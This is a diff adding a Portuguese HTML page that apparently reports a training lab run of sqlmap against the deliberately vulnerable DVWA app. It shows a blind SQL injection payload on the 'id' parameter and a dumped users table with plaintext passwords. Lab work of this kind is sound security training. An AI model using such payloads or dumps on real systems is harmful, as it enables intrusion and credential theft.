@@ -1,1 +1,51 @@
-<h2>Play 03 - SQLMap</h2><p>Relatório do SQLMap aqui.</p>
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <title>Relatório - SQLMap</title>
+  <style>
+    body {
+      background-color: black;
+      color: #00ff00;
+      font-family: monospace;
+      padding: 1rem;
+    }
+    h1 {
+      text-align: center;
+    }
+    pre {
+      background-color: #111;
+      padding: 1rem;
+      border: 1px solid #00ff00;
+      overflow-x: auto;
+    }
+  </style>
+</head>
+<body>
+  <h1>Relatório - SQLMap vs DVWA</h1>
+  <pre>
+sqlmap identified the following injection point(s) with a total of 50 HTTP(s) requests:
+
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 1=1--
+
+Database: dvwa
+[1 table]
++-----------+
+| users     |
++-----------+
+
+Table: users
+[3 entries]
++----+--------+----------+
+| id | user   | password |
++----+--------+----------+
+| 1  | admin  | admin    |
+| 2  | user   | password |
+| 3  | test   | 123456   |
++----+--------+----------+
+  </pre>
+</body>
+</html>
